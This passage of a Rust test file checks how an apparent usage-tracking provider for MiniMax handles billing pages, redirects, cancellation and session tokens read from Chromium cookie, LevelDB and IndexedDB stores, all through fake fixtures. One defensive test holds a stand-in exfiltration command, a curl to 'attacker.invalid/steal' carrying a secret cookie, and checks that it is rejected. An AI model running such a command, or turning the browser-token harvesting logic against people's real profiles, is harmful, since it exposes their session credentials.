        .find(|section| section.title() == Some("Billing history"))
        .expect("billing detail section");
    assert_eq!(billing.rows()[0].value(), "2,000");
    assert_eq!(billing.rows()[1].value(), "2,500");
    assert_eq!(billing.chart().expect("daily chart").points().len(), 2);
    assert_eq!(
        global.requests()[1].target(),
        "/account/amount?page=1&limit=100&aggregate=false"
    );
}

#[tokio::test]
async fn billing_uses_injected_local_calendar_across_utc_midnight() {
    let fetched_at = 1_781_483_400; // 2026-06-15 00:30:00 UTC.
    let record_at = 1_781_476_200; // 2026-06-14 22:30:00 UTC, June 15 at UTC+03.
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, NORMAL.to_vec()),
        FakeHttpResponse::new(200, billing_page(1, 1, record_at, 7, "0.07")),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=local-calendar-billing",
        routes(&global, &china),
    )
    .expect("local-calendar billing provider")
    .with_billing_local_offset(UtcOffset::from_hms(3, 0, 0).expect("UTC+03"));
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(fetched_at),
        )
        .await
        .expect("local-calendar billing fetch");
    let history = sample.cost_usage().expect("local-calendar history");
    assert_eq!(history.session().total_tokens(), Some(7));
    assert_eq!(history.daily()[0].day(), "2026-06-15");
    assert_eq!(history.history_label(), Some("Last 30 days (local)"));
}

#[tokio::test]
async fn billing_paginates_until_vendor_total_and_establishes_coverage() {
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, NORMAL.to_vec()),
        FakeHttpResponse::new(200, billing_page(100, 101, 1_781_481_600, 1, "0.01")),
        FakeHttpResponse::new(200, billing_page(1, 101, 1_781_395_200, 5, "0.05")),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=paged-billing-canary",
        routes(&global, &china),
    )
    .expect("paged billing provider");
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(1_781_481_600),
        )
        .await
        .expect("paged billing fetch");
    let history = sample.cost_usage().expect("paged billing history");
    assert!(history.history_coverage_is_established());
    assert_eq!(history.history().total_tokens(), Some(105));
    assert_eq!(
        history.history().amount().expect("paged cash").get(),
        Decimal::new(105, 2)
    );
    let requests = global.requests();
    assert_eq!(requests.len(), 3);
    assert_eq!(
        requests[1].target(),
        "/account/amount?page=1&limit=100&aggregate=false"
    );
    assert_eq!(
        requests[2].target(),
        "/account/amount?page=2&limit=100&aggregate=false"
    );
}

#[tokio::test]
async fn billing_stops_at_thirty_day_cutoff_and_marks_coverage() {
    let fetched_at = 1_781_481_600;
    let older_than_window = fetched_at - 30 * 86_400;
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, NORMAL.to_vec()),
        FakeHttpResponse::new(200, billing_page(1, 999, older_than_window, 7, "0.07")),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=cutoff-billing-canary",
        routes(&global, &china),
    )
    .expect("cutoff billing provider");
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(fetched_at),
        )
        .await
        .expect("cutoff billing fetch");
    let history = sample.cost_usage().expect("cutoff billing history");
    assert!(history.history_coverage_is_established());
    assert_eq!(history.history().total_tokens(), Some(0));
    assert_eq!(global.requests().len(), 2);
}

#[tokio::test]
async fn billing_page_cap_returns_bounded_partial_coverage() {
    let mut responses = vec![FakeHttpResponse::new(200, NORMAL.to_vec())];
    responses.extend(
        (0..64).map(|_| FakeHttpResponse::new(200, billing_page(1, 999, 1_781_481_600, 1, "0.01"))),
    );
    let global = FakeHttpServer::start(responses).await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=bounded-billing-canary",
        routes(&global, &china),
    )
    .expect("bounded billing provider");
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(1_781_481_600),
        )
        .await
        .expect("bounded partial billing fetch");
    let history = sample.cost_usage().expect("bounded billing history");
    assert!(!history.history_coverage_is_established());
    assert_eq!(history.history().total_tokens(), Some(64));
    assert_eq!(global.requests().len(), 65);
    assert_eq!(
        global.requests()[64].target(),
        "/account/amount?page=64&limit=100&aggregate=false"
    );
}

#[tokio::test]
async fn optional_billing_failure_preserves_quota_but_bearer_auth_failure_propagates() {
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, NORMAL.to_vec()),
        FakeHttpResponse::new(500, b"private failure".to_vec()),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let cookie_only = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=optional-billing-canary",
        routes(&global, &china),
    )
    .expect("cookie provider");
    let sample = cookie_only
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("quota survives optional billing failure");
    assert!(sample.primary().is_some());
    assert!(sample.cost_usage().is_none());

    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, NORMAL.to_vec()),
        FakeHttpResponse::new(
            200,
            br#"{"base_resp":{"status_code":1004,"status_msg":"billing unavailable"}}"#.to_vec(),
        ),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let bearer_api_envelope = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        concat!(
            "curl 'https://platform.minimax.io/user-center/payment/coding-plan' ",
            "-H 'Cookie: session=billing-envelope-cookie' ",
            "-H 'Authorization: Bearer billing-envelope-bearer-0123456789'"
        ),
        routes(&global, &china),
    )
    .expect("bearer billing envelope provider");
    let sample = bearer_api_envelope
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("billing base response is optional even with bearer");
    assert!(sample.primary().is_some());
    assert!(sample.cost_usage().is_none());
    assert_eq!(global.requests().len(), 2);

    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, NORMAL.to_vec()),
        FakeHttpResponse::new(401, Vec::new()),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let bearer = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        concat!(
            "curl 'https://platform.minimax.io/user-center/payment/coding-plan' ",
            "-H 'Cookie: session=bearer-cookie-canary' ",
            "-H 'Authorization: Bearer bearer-auth-canary-0123456789'"
        ),
        routes(&global, &china),
    )
    .expect("bearer provider");
    let error = bearer
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("bearer billing authentication must propagate");
    assert_eq!(error.kind(), ErrorKind::AuthenticationExpired);
}

#[tokio::test]
async fn parseable_html_survives_remains_network_failure_but_not_auth_failure() {
    let html = b"<html><main>Coding Plan Plus available usage 1000 prompts / 5 hours</main></html>";
    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, html.to_vec()).header("content-type", "text/html"),
        FakeHttpResponse::truncated(200, 20, b"{".to_vec()),
        FakeHttpResponse::truncated(200, 20, b"{".to_vec()),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=html-network-fallback",
        routes(&global, &china),
    )
    .expect("HTML fallback provider")
    .with_billing_history(false);
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("parseable HTML survives optional remains network failure");
    assert_eq!(
        sample
            .identity()
            .login_method()
            .expect("HTML plan")
            .as_str(),
        "Plus"
    );
    assert_eq!(global.requests().len(), 3);

    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, html.to_vec()).header("content-type", "text/html"),
        FakeHttpResponse::new(
            200,
            br#"{"base_resp":{"status_code":1004,"status_msg":"log in again"}}"#.to_vec(),
        ),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_manual_capture_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        "HERTZ-SESSION=html-auth-required",
        routes(&global, &china),
    )
    .expect("HTML auth provider")
    .with_billing_history(false);
    let error = provider
        .fetch_at(
            &context("account-a", ProviderSource::ManualCookie),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("remains authentication is authoritative");
    assert_eq!(error.kind(), ErrorKind::AuthenticationExpired);
}

#[tokio::test]
async fn redirects_are_not_followed_and_cancellation_is_prompt() {
    let global = FakeHttpServer::start([FakeHttpResponse::new(302, Vec::new())
        .header("location", "https://api.minimaxi.com/v1/token_plan/remains")])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_api_key_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        API_TOKEN,
        routes(&global, &china),
    )
    .expect("redirect provider");
    let error = provider
        .fetch_at(
            &context("account-a", ProviderSource::ApiKey),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect_err("redirect is rejected");
    assert_eq!(error.kind(), ErrorKind::Parse);
    assert_eq!(global.requests().len(), 1);
    assert!(china.requests().is_empty());

    let global = FakeHttpServer::start([]).await;
    let china = FakeHttpServer::start([FakeHttpResponse::stall()]).await;
    let provider = MiniMaxProvider::from_api_key_routes(
        scope("account-a"),
        MiniMaxRegion::ChinaMainland,
        API_TOKEN,
        routes(&global, &china),
    )
    .expect("cancel provider");
    let cancellation = CancellationToken::new();
    cancellation.cancel();
    let cancelled = ProviderContext::new(scope("account-a"), ProviderSource::ApiKey, cancellation);
    let error = tokio::time::timeout(
        std::time::Duration::from_secs(1),
        provider.fetch_at(&cancelled, timestamp(NOW_SECONDS)),
    )
    .await
    .expect("cancellation is prompt")
    .expect_err("cancelled request");
    assert_eq!(error.kind(), ErrorKind::Network);
}

#[tokio::test]
async fn browser_profiles_rotate_leveldb_token_then_cookie_only_in_discovery_order() {
    let fixture = TestDirectory::new();
    fixture.directory("home");
    fixture.directory("home/config");
    let chromium = "home/config/chromium/Default";
    let chrome = "home/config/google-chrome/Default";
    fixture.directory(chromium);
    fixture.directory(chrome);
    write_cookie_database(&fixture, chromium, BROWSER_TOKEN_A);
    write_cookie_database(&fixture, chrome, BROWSER_TOKEN_B);
    write_profile_storage(&fixture, chromium, BROWSER_TOKEN_A);
    write_profile_storage(&fixture, chrome, BROWSER_TOKEN_B);

    let global = FakeHttpServer::start([
        FakeHttpResponse::new(401, Vec::new()),
        FakeHttpResponse::new(401, Vec::new()),
        FakeHttpResponse::new(200, NORMAL.to_vec()),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_browser_discovery_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        &fixture.discovery(),
        OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
        &DisabledChromiumCookieDecryptor,
        routes(&global, &china),
    )
    .expect("browser provider")
    .with_billing_history(false);
    let sample = provider
        .fetch_at(
            &context("account-a", ProviderSource::BrowserSession),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("ordered profile rotation");
    assert_percent(
        sample
            .primary()
            .expect("interval")
            .used_percent()
            .expect("percent")
            .get(),
        4.0,
    );

    let requests = global.requests();
    assert_eq!(requests.len(), 3);
    let bearer_a = format!("Bearer {BROWSER_TOKEN_A}");
    let bearer_b = format!("Bearer {BROWSER_TOKEN_B}");
    assert_eq!(requests[0].header("authorization"), Some(bearer_a.as_str()));
    assert_eq!(requests[1].header("authorization"), None);
    assert_eq!(requests[2].header("authorization"), Some(bearer_b.as_str()));
    assert!(
        requests[0]
            .header("cookie")
            .is_some_and(|cookie| cookie.contains(BROWSER_TOKEN_A))
    );
    assert!(
        requests[2]
            .header("cookie")
            .is_some_and(|cookie| cookie.contains(BROWSER_TOKEN_B))
    );
}

#[tokio::test]
async fn malformed_leveldb_table_and_bad_wal_crc_never_become_bearer_credentials() {
    for (name, bytes) in [
        ("000001.ldb", b"not-a-leveldb-table".as_slice()),
        (
            "000001.log",
            b"\0\0\0\0\x20\0\x01minimax-browser-token-evil-cccccccccccccccccccccccccccccccccccccccccccccccc"
                .as_slice(),
        ),
    ] {
        let fixture = TestDirectory::new();
        fixture.directory("home");
        fixture.directory("home/config");
        let profile = "home/config/chromium/Default";
        fixture.directory(profile);
        write_cookie_database(&fixture, profile, "cookie-fallback-session-canary");
        fixture.write(
            format!("{profile}/Local Storage/leveldb/{name}"),
            bytes,
        );

        let global = FakeHttpServer::start([FakeHttpResponse::new(200, NORMAL.to_vec())]).await;
        let china = FakeHttpServer::start([]).await;
        let provider = MiniMaxProvider::from_browser_discovery_routes(
            scope("account-a"),
            MiniMaxRegion::Global,
            &fixture.discovery(),
            OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
            &DisabledChromiumCookieDecryptor,
            routes(&global, &china),
        )
        .expect("cookie fallback provider")
        .with_billing_history(false);
        provider
            .fetch_at(
                &context("account-a", ProviderSource::BrowserSession),
                timestamp(NOW_SECONDS),
            )
            .await
            .expect("safe cookie fallback");
        let request = global.requests().into_iter().next().expect("request");
        assert_eq!(
            request.header("authorization"),
            Some("Bearer cookie-fallback-session-canary")
        );
        assert!(!format!("{request:?}").contains("evil"));
    }
}

#[tokio::test]
async fn session_storage_and_indexeddb_tokens_precede_hertz_cookie_fallback() {
    let cases = [
        (
            "Session Storage/000001.log",
            vec![
                (b"namespace-platform.minimax.io".to_vec(), b"7".to_vec()),
                (
                    b"map-7-access".to_vec(),
                    format!(r#"{{"access_token":"{BROWSER_TOKEN_A}"}}"#).into_bytes(),
                ),
            ],
            BROWSER_TOKEN_A,
        ),
        (
            "IndexedDB/https_platform.minimax.io_0.indexeddb.leveldb/000001.log",
            vec![(
                b"auth".to_vec(),
                format!(r#"{{"access_token":"{BROWSER_TOKEN_B}"}}"#).into_bytes(),
            )],
            BROWSER_TOKEN_B,
        ),
    ];
    for (relative, records, expected_token) in cases {
        let fixture = TestDirectory::new();
        fixture.directory("home");
        fixture.directory("home/config");
        let profile = "home/config/chromium/Default";
        fixture.directory(profile);
        write_cookie_database(&fixture, profile, "hertz-cookie-fallback-token");
        let batch = write_batch(1, &records);
        fixture.write(format!("{profile}/{relative}"), physical_record(1, &batch));

        let global = FakeHttpServer::start([FakeHttpResponse::new(200, NORMAL.to_vec())]).await;
        let china = FakeHttpServer::start([]).await;
        let provider = MiniMaxProvider::from_browser_discovery_routes(
            scope("account-a"),
            MiniMaxRegion::Global,
            &fixture.discovery(),
            OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
            &DisabledChromiumCookieDecryptor,
            routes(&global, &china),
        )
        .expect("browser storage provider")
        .with_billing_history(false);
        provider
            .fetch_at(
                &context("account-a", ProviderSource::BrowserSession),
                timestamp(NOW_SECONDS),
            )
            .await
            .expect("browser storage fetch");
        let authorization = format!("Bearer {expected_token}");
        assert_eq!(
            global.requests()[0].header("authorization"),
            Some(authorization.as_str())
        );
    }
}

#[tokio::test]
async fn storage_accepts_short_marked_tokens_prefers_long_tokens_and_keeps_nonnumeric_group_ids() {
    let short = "short-marked-token-1234567890";
    assert!((20..60).contains(&short.len()));
    let cases = [
        (
            format!(r#"{{"access_token":"{short}","groupId":"team-alpha"}}"#),
            short,
            Some("team-alpha"),
        ),
        (
            format!(r#"{{"access_token":"{short}","id_token":"{BROWSER_TOKEN_A}"}}"#),
            BROWSER_TOKEN_A,
            None,
        ),
    ];
    for (storage, expected_token, expected_group) in cases {
        let fixture = TestDirectory::new();
        fixture.directory("home");
        fixture.directory("home/config");
        let profile = "home/config/chromium/Default";
        fixture.directory(profile);
        write_cookie_database(&fixture, profile, "storage-cookie-fallback");
        let key = b"_https://platform.minimax.io\0\x01auth-session".to_vec();
        let mut value = vec![1];
        value.extend_from_slice(storage.as_bytes());
        let batch = write_batch(1, &[(key, value)]);
        fixture.write(
            format!("{profile}/Local Storage/leveldb/000001.log"),
            physical_record(1, &batch),
        );

        let mut responses = vec![FakeHttpResponse::new(200, NORMAL.to_vec())];
        if expected_group.is_some() {
            responses.push(FakeHttpResponse::new(
                200,
                br#"{"current_subscription":{"name":"TokenPlanPlus"}}"#.to_vec(),
            ));
        }
        let global = FakeHttpServer::start(responses).await;
        let china = FakeHttpServer::start([]).await;
        let provider = MiniMaxProvider::from_browser_discovery_routes(
            scope("account-a"),
            MiniMaxRegion::Global,
            &fixture.discovery(),
            OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
            &DisabledChromiumCookieDecryptor,
            routes(&global, &china),
        )
        .expect("browser marked-token provider")
        .with_billing_history(false);
        provider
            .fetch_at(
                &context("account-a", ProviderSource::BrowserSession),
                timestamp(NOW_SECONDS),
            )
            .await
            .expect("marked storage token fetch");
        let requests = global.requests();
        let authorization = format!("Bearer {expected_token}");
        assert_eq!(
            requests[0].header("authorization"),
            Some(authorization.as_str())
        );
        if let Some(group) = expected_group {
            assert_eq!(requests.len(), 2);
            assert_eq!(requests[1].header("x-group-id"), Some(group));
            assert_eq!(requests[1].header("authorization"), None);
        }
    }
}

#[tokio::test]
async fn browser_merges_network_and_primary_cookie_stores_per_profile() {
    let fixture = TestDirectory::new();
    fixture.directory("home");
    fixture.directory("home/config");
    let profile = "home/config/chromium/Default";
    fixture.directory(profile);
    let primary = create_chromium_cookie_database(&fixture.0.join(profile).join("Cookies"));
    insert_chromium_cookie(
        &primary,
        ".minimax.io",
        "HERTZ-SESSION",
        "/",
        "primary-store-session-canary",
    );
    let network = create_chromium_cookie_database(&fixture.0.join(profile).join("Network/Cookies"));
    insert_chromium_cookie(
        &network,
        ".example.com",
        "unrelated",
        "/",
        "must-not-mask-primary",
    );
    drop(primary);
    drop(network);

    let global = FakeHttpServer::start([FakeHttpResponse::new(200, NORMAL.to_vec())]).await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_browser_discovery_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        &fixture.discovery(),
        OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
        &DisabledChromiumCookieDecryptor,
        routes(&global, &china),
    )
    .expect("merged browser provider")
    .with_billing_history(false);
    provider
        .fetch_at(
            &context("account-a", ProviderSource::BrowserSession),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("primary store remains visible");
    assert_eq!(
        global.requests()[0].header("authorization"),
        Some("Bearer primary-store-session-canary")
    );
}

#[tokio::test]
async fn browser_route_cookies_are_host_and_path_scoped_without_cross_region_leaks() {
    let fixture = TestDirectory::new();
    fixture.directory("home");
    fixture.directory("home/config");
    let profile = "home/config/chromium/Default";
    fixture.directory(profile);
    let database = create_chromium_cookie_database(&fixture.0.join(profile).join("Cookies"));
    insert_chromium_cookie(
        &database,
        "platform.minimax.io",
        "plan_cookie",
        "/user-center/payment",
        "plan-only",
    );
    insert_chromium_cookie(
        &database,
        "platform.minimax.io",
        "platform_cookie",
        "/v1/api/openplatform/coding_plan",
        "platform-only",
    );
    insert_chromium_cookie(
        &database,
        "www.minimax.io",
        "web_cookie",
        "/v1/api/openplatform/coding_plan",
        "web-only",
    );
    insert_chromium_cookie(
        &database,
        ".minimaxi.com",
        "china_cookie",
        "/",
        "china-secret",
    );
    drop(database);

    let global = FakeHttpServer::start([
        FakeHttpResponse::new(200, b"<html>no quota fields</html>".to_vec())
            .header("content-type", "text/html"),
        FakeHttpResponse::new(404, Vec::new()),
        FakeHttpResponse::new(200, NORMAL.to_vec()),
    ])
    .await;
    let china = FakeHttpServer::start([]).await;
    let provider = MiniMaxProvider::from_browser_discovery_routes(
        scope("account-a"),
        MiniMaxRegion::Global,
        &fixture.discovery(),
        OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
        &DisabledChromiumCookieDecryptor,
        routes(&global, &china),
    )
    .expect("scoped browser provider")
    .with_billing_history(false);
    provider
        .fetch_at(
            &context("account-a", ProviderSource::BrowserSession),
            timestamp(NOW_SECONDS),
        )
        .await
        .expect("platform-to-web remains fallback");

    let requests = global.requests();
    assert_eq!(requests.len(), 3);
    let plan = requests[0].header("cookie").expect("plan cookie");
    assert!(plan.contains("plan_cookie=plan-only"));
    assert!(!plan.contains("platform_cookie"));
    assert!(!plan.contains("web_cookie"));
    assert!(!plan.contains("china_cookie"));
    let platform = requests[1].header("cookie").expect("platform cookie");
    assert!(platform.contains("platform_cookie=platform-only"));
    assert!(!platform.contains("plan_cookie"));
    assert!(!platform.contains("web_cookie"));
    assert!(!platform.contains("china_cookie"));
    let web = requests[2].header("cookie").expect("web cookie");
    assert!(web.contains("web_cookie=web-only"));
    assert!(!web.contains("plan_cookie"));
    assert!(!web.contains("platform_cookie"));
    assert!(!web.contains("china_cookie"));
}

#[test]
fn disabled_browser_and_unsafe_manual_capture_fail_without_secret_disclosure() {
    let error = MiniMaxProvider::new_browser(
        scope("account-a"),
        MiniMaxRegion::Global,
        &BrowserProfileDiscovery::disabled(),
        OffsetDateTime::from_unix_timestamp(NOW_SECONDS).expect("browser now"),
    )
    .expect_err("disabled browser discovery");
    assert_eq!(error.kind(), ErrorKind::MissingCredential);

    let secret = "minimax-super-sensitive-cookie-canary";
    let capture =
        format!("curl 'https://attacker.invalid/steal' -H 'Cookie: HERTZ-SESSION={secret}'");
    let error = MiniMaxProvider::new_manual(scope("account-a"), MiniMaxRegion::Global, &capture)
        .expect_err("foreign capture URL");
    assert_eq!(error.kind(), ErrorKind::Parse);
    assert!(!format!("{error:?}").contains(secret));

    let error = MiniMaxProvider::new_api_key(
        provider_scope(ProviderId::Mistral, "account-a"),
        MiniMaxRegion::Global,
        "minimax-wrong-scope-secret",
    )
    .expect_err("wrong provider scope");
    assert_eq!(error.kind(), ErrorKind::Api);
    assert!(!format!("{error:?}").contains("wrong-scope-secret"));
}

#[test]
fn descriptor_declares_exact_sources_browser_auth_and_cost_history() {
    let descriptor = descriptor_for(ProviderId::MiniMax);
    assert_eq!(descriptor.display_name, "MiniMax");
    assert_eq!(
        descriptor.sources().iter().collect::<Vec<_>>(),
        [
            ProviderSource::ApiKey,
            ProviderSource::ManualCookie,
            ProviderSource::BrowserSession,
        ]
    );
    assert!(
        descriptor
            .capabilities()
            .contains(ProviderCapability::Usage)
    );
    assert!(
        descriptor
            .capabilities()
            .contains(ProviderCapability::BrowserAuth)
    );
    assert!(
        descriptor
            .capabilities()
            .contains(ProviderCapability::CostHistory)
    );
}

fn write_cookie_database(fixture: &TestDirectory, profile: &str, session: &str) {
    let path = fixture.0.join(profile).join("Cookies");
    let connection = create_chromium_cookie_database(&path);
    insert_chromium_cookie(&connection, ".minimax.io", "HERTZ-SESSION", "/", session);
}

fn create_chromium_cookie_database(path: &Path) -> Connection {
    fs::create_dir_all(path.parent().expect("cookie database parent"))
        .expect("create cookie database parent");
    let connection = Connection::open(path).expect("open Chromium cookie database");
    connection
        .execute_batch(
            "CREATE TABLE cookies(
                host_key TEXT NOT NULL,
                name TEXT NOT NULL,
                path TEXT NOT NULL,
                expires_utc INTEGER NOT NULL,
                is_secure INTEGER NOT NULL,
                value TEXT NOT NULL,
                encrypted_value BLOB
             );
             CREATE TABLE meta(key TEXT NOT NULL, value);
             INSERT INTO meta(key, value) VALUES ('version', 23);",
        )
        .expect("create Chromium cookie schema");
    connection
}

fn insert_chromium_cookie(
    connection: &Connection,
    host: &str,
    name: &str,
    path: &str,
    value: &str,
) {
    connection
        .execute(
            "INSERT INTO cookies(
                host_key, name, path, expires_utc, is_secure, value, encrypted_value
             ) VALUES (?1, ?2, ?3, 0, 1, ?4, X'')",
            params![host, name, path, value],
        )
        .expect("insert MiniMax session cookie");
}

fn write_profile_storage(fixture: &TestDirectory, profile: &str, token: &str) {
    let key = b"_https://platform.minimax.io\0\x01auth-session".to_vec();
    let mut value = vec![1];
    value.extend_from_slice(format!(r#"{{"access_token":"{token}"}}"#).as_bytes());
    let batch = write_batch(1, &[(key, value)]);
    fixture.write(
        format!("{profile}/Local Storage/leveldb/000001.log"),
        physical_record(1, &batch),
    );
}

fn write_batch(sequence: u64, operations: &[(Vec<u8>, Vec<u8>)]) -> Vec<u8> {
    let mut output = Vec::new();
    output.extend_from_slice(&sequence.to_le_bytes());
    output.extend_from_slice(
        &u32::try_from(operations.len())
            .expect("fixture operation count")
            .to_le_bytes(),
    );
    for (key, value) in operations {
        output.push(1);
        put_slice(&mut output, key);
        put_slice(&mut output, value);
    }
    output
}

fn put_slice(output: &mut Vec<u8>, value: &[u8]) {
    put_varint(output, u64::try_from(value.len()).expect("fixture length"));
    output.extend_from_slice(value);
}

fn put_varint(output: &mut Vec<u8>, mut value: u64) {
    while value >= 0x80 {
        output.push(u8::try_from(value & 0x7f).expect("varint byte") | 0x80);
        value >>= 7;
    }
    output.push(u8::try_from(value).expect("final varint byte"));
}

fn physical_record(record_type: u8, payload: &[u8]) -> Vec<u8> {
    let mut output = Vec::new();
    output.extend_from_slice(&masked_crc32c(record_type, payload).to_le_bytes());
    output.extend_from_slice(
        &u16::try_from(payload.len())
            .expect("fixture record length")
            .to_le_bytes(),
    );
    output.push(record_type);
    output.extend_from_slice(payload);
    output
}

fn masked_crc32c(record_type: u8, payload: &[u8]) -> u32 {
    let crc = crc32c_extend(crc32c_extend(!0_u32, &[record_type]), payload);
    let crc = !crc;
    crc.rotate_right(15).wrapping_add(0xa282_ead8)
}

fn crc32c_extend(mut crc: u32, bytes: &[u8]) -> u32 {
    for byte in bytes {
        crc ^= u32::from(*byte);
        for _ in 0..8 {
            crc = (crc >> 1) ^ (0x82f6_3b78_u32 & (0_u32.wrapping_sub(crc & 1)));
        }
    }
    crc
}
